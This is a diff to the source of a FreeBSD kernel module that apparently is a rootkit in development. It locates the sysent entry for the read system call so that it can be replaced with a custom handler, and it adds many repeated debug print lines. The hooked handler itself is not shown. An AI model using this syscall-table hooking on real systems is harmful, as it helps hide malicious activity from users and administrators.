@@ -79,8 +79,7 @@ static int custom_sysread(struct thread *td, void *syscall_args) {
 // Find the memory address of the sysent table and point to our handlers if found.
 static int find_sysread_address (void) {
 
-    // Store memory address of sysent table, See 4.
-    original_sysread = &sysent[SYS_read];
+
 
     // temp check that theres a valid address for sys_read
     if (&sysent[SYS_read] == NULL) {
@@ -88,7 +87,27 @@ static int find_sysread_address (void) {
         return 2;  // Return error
     }
 
-    // store address
+    // Store memory address of sysent table, See 4.
+    uprintf("made it this far");
+    uprintf("made it this far");
+    uprintf("made it this far");
+    uprintf("made it this far");
+    uprintf("made it this far");
+    uprintf("made it this far");
+    uprintf("made it this far");
+    uprintf("made it this far");
+    uprintf("made it this far");
+    uprintf("made it this far");
+    uprintf("made it this far");
+    uprintf("made it this far");
+    uprintf("made it this far");
+    uprintf("made it this far");
+    uprintf("made it this far");
+    uprintf("made it this far");
+    uprintf("made it this far");
+    uprintf("made it this far");
+    uprintf("made it this far");
+    uprintf("made it this far");
     original_sysread = &sysent[SYS_read];
 
     // temp check to see if we stored the address
@@ -128,6 +147,25 @@ static int rootkit_handler(struct module *module, int event, void *arg) {
     int search_table_case = 0;
     switch (event) {
     case MOD_LOAD:
+        uprintf("module loaded");
+        uprintf("module loaded");
+        uprintf("module loaded");
+        uprintf("module loaded");
+        uprintf("module loaded");
+        uprintf("module loaded");
+        uprintf("module loaded");
+        uprintf("module loaded");
+        uprintf("module loaded");
+        uprintf("module loaded");
+        uprintf("module loaded");
+        uprintf("module loaded");
+        uprintf("module loaded");
+        uprintf("module loaded");
+        uprintf("module loaded");
+        uprintf("module loaded");
+        uprintf("module loaded");
+        uprintf("module loaded");
+        uprintf("module loaded");
         search_table_case = find_sysread_address();
         if (search_table_case == 0) {
             uprintf("No error with finding sysent table address.\n");
